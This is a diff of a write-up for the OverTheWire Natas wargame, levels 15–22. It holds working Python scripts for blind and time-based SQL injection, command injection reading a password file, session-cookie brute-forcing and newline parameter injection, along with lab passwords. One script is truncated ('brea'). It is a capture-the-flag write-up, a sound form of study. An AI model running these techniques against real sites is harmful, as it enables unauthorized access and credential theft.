@@ -320,35 +320,35 @@ For the sake of time I just looked for other solutions for this level and took [
 > import requests
 > target = 'http://natas15.natas.labs.overthewire.org'
 > charset_0 = (
-> 	'0123456789' +
-> 	'abcdefghijklmnopqrstuvwxyz' +
-> 	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+>     '0123456789' +
+>     'abcdefghijklmnopqrstuvwxyz' +
+>     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 > )
 > webauth = ('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
 > charset_1 = ''
 > for c in charset_0:
-> 	username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
-> 	r = requests.get(target,
-> 		auth=webauth,
-> 		params={"username": username}
-> 	)
-> 	if "This user exists" in r.text:
-> 		charset_1 += c
-> 		print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
+>     username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
+>     r = requests.get(target,
+>         auth=webauth,
+>         params={"username": username}
+>     )
+>     if "This user exists" in r.text:
+>         charset_1 += c
+>         print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
 > 
 > password = ""
 > while len(password) != 32:
-> 	for c in charset_1:
-> 		t = password + c
-> 		username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
-> 		r = requests.get(target,
-> 			auth=webauth,
-> 			params={"username": username}
-> 		)
-> 		if "This user exists" in r.text:
-> 			print ('PASS: ' + t.ljust(32, '*'))
-> 			password = t
-> 			break
+>     for c in charset_1:
+>         t = password + c
+>         username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
+>         r = requests.get(target,
+>             auth=webauth,
+>             params={"username": username}
+>         )
+>         if "This user exists" in r.text:
+>             print ('PASS: ' + t.ljust(32, '*'))
+>             password = t
+>             break
 > ```
 
 Once that's done we get the password.
@@ -374,36 +374,36 @@ I used the same python code from the previous level, but with some changes.
 > import requests
 > target = 'http://natas16.natas.labs.overthewire.org'
 > charset_0 = (
-> 	'0123456789' +
-> 	'abcdefghijklmnopqrstuvwxyz' +
-> 	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+>     '0123456789' +
+>     'abcdefghijklmnopqrstuvwxyz' +
+>     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 > )
 > webauth = ('natas16','TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
 > charset_1 = ''
 > 
 > for c in charset_0:
-> 	username = ('$(grep ' + c +' /etc/natas_webpass/natas17)helium')
-> 	r = requests.get(target,
-> 		auth=webauth,
-> 		params={"needle": username}
-> 	)
-> 	if "helium" not in r.text:
-> 		charset_1+=c
-> 		print ('CSET: ' + charset_1.ljust(32, '*'))
+>     username = ('$(grep ' + c +' /etc/natas_webpass/natas17)helium')
+>     r = requests.get(target,
+>         auth=webauth,
+>         params={"needle": username}
+>     )
+>     if "helium" not in r.text:
+>         charset_1+=c
+>         print ('CSET: ' + charset_1.ljust(32, '*'))
 > 
 > password = ""
 > while len(password) != 32:
-> 	for c in charset_1:
-> 		t = password + c
-> 		username = ('$(grep -E ^' + t +'.* /etc/natas_webpass/natas17)helium')
-> 		r = requests.get(target,
-> 			auth=webauth,
-> 			params={"needle": username}
-> 		)
-> 		if "helium" not in r.text:
-> 			print ('PASS: ' + t.ljust(32, '*'))
-> 			password = t
-> 			break
+>     for c in charset_1:
+>         t = password + c
+>         username = ('$(grep -E ^' + t +'.* /etc/natas_webpass/natas17)helium')
+>         r = requests.get(target,
+>             auth=webauth,
+>             params={"needle": username}
+>         )
+>         if "helium" not in r.text:
+>             print ('PASS: ' + t.ljust(32, '*'))
+>             password = t
+>             brea
 > ```
 
 This is the password we get:
@@ -417,6 +417,151 @@ XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
 ```
 Username: natas17
 URL:      http://natas17.natas.labs.overthewire.org
+```
+
+This is just natas15 but now it doesn't confirm if we got it right with the text. Both correct and incorrect usernames don't have anything to display. So we have to rely purely on SQL to brute force. One way we can do this is with the `sleep(secs)` command, so that if a string exists in the password then it will sleep for a number of seconds (We'll use two, but you can increase it if you want). The input will look like this: `natas16" AND password LIKE BINARY "(pass)&" AND sleep(2) #` You'll be waiting alot longer though. Here's the updated code.
+
+```python
+import requests
+target = 'http://natas17.natas.labs.overthewire.org'
+charset_0 = (
+    '0123456789' +
+    'abcdefghijklmnopqrstuvwxyz' +
+    'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+)
+webauth = ('natas17','XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
+charset_1 = ''
+for c in charset_0:
+    username = ('natas18" AND password LIKE BINARY "%' + c +'%" AND sleep(2) #')
+    r = requests.get(target,
+        auth=webauth,
+        params={"username": username}
+    )
+    if r.elapsed.total_seconds() >= 2:
+        charset_1 += c
+        print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
+
+password = ""
+while len(password) != 32:
+    for c in charset_1:
+        t = password + c
+        username = ('natas18" AND password LIKE BINARY "' + t +'%" AND sleep(2) #')
+        r = requests.get(target,
+            auth=webauth,
+            params={"username": username}
+        )
+        if r.elapsed.total_seconds() >= 2:
+            print ('PASS: ' + t.ljust(32, '*'))
+            password = t
+            break
+```
+
+We got this password:
+
+```
+8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+```
+
+# 18
+
+```
+Username: natas18
+URL:      http://natas18.natas.labs.overthewire.org
+```
+
+It looks like a login page where we need to be admin to get the password. Looking at the source code it seems it uses a cookie called `PHPSESSID`, which goes from 0 to 640, and tells what user it is logged onto. So we can just go through the entire range and see which session ID is admin.  We don't need to input anything else! 
+
+```python
+import requests
+target = 'http://natas18.natas.labs.overthewire.org'
+webauth = ('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
+
+for uid in range(640):
+    r = requests.get(target,
+        auth=webauth,
+        cookies={"PHPSESSID": str(uid)}
+    )
+    print("ID: " + str(uid))
+    if "You are an admin. The credentials for the next level are:" in r.text:
+        print(r.text.split("Password:")[1].split('<')[0].strip())
+        break
+```
+
+The password we get in session id 281 is
+
+```
+8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
+```
+
+# 19
+
+```
+Username: natas19
+URL:      http://natas19.natas.labs.overthewire.org
+```
+
+According to the website it is similar to the previous levels except the session ID is not sequential. I logged in as "admin" with a random password, saw the cookie and realized it was in hexadecimal, `3538302d61646d696e`, which translates to `580-admin`. So we just do the same thing as last time except add the extra text and convert to hex.
+
+```python
+import requests
+target = 'http://natas19.natas.labs.overthewire.org'
+webauth = ('natas19','8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
+
+for uid in range(640):
+    newid = (str(uid) + "-admin").encode("utf-8").hex()
+    r = requests.get(target,
+        auth=webauth,
+        cookies={"PHPSESSID": newid}
+    )
+    print("ID: " + newid)
+    if "You are an admin. The credentials for the next level are:" in r.text:
+        print(r.text.split("Password:")[1].split('<')[0].strip())
+        break
+```
+
+We get this at ID: 281
+
+```
+guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
+```
+
+# 20
+
+```
+Username: natas20
+URL:      http://natas20.natas.labs.overthewire.org
+```
+
+For this one it seems the cookie is completely random, but the source code changes how it is read and written. I was stumped in this level, but after looking around, I found out that it uses a file to store two values: `name` and `admin`, and they are stored in plaintext and are separated with a newline character. We can only set `name` however, and we need to do this through the URL only. I did `http://natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin+1`, then refreshed the page. Sometimes this didn't work and I had to delete the cookie beforehand.
+
+```
+You are an admin. The credentials for the next level are:
+
+Username: natas21
+Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
+```
+
+# 21
+
+```
+Username: natas21
+URL:      http://natas21.natas.labs.overthewire.org
+```
+
+The main website doesn't do anything other than display the password if `admin` equals 1. The CSS experimenter website, however, lets us change the value of `admin` freely. It seems we also need to set `submit` to `Update` for it to work aswell. I entered `http://natas21-experimenter.natas.labs.overthewire.org/index.php?submit=Update&admin=1` and it sets the cookie automatically. Since both websites are basically the same, all we need to do is copy the cookie of the experimenter website and set it as the one for the main site aswell.
+
+```
+You are an admin. The credentials for the next level are:
+
+Username: natas22
+Password: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
+```
+
+# 22
+
+```
+Username: natas22
+URL:      http://natas22.natas.labs.overthewire.org
 ```
 
 
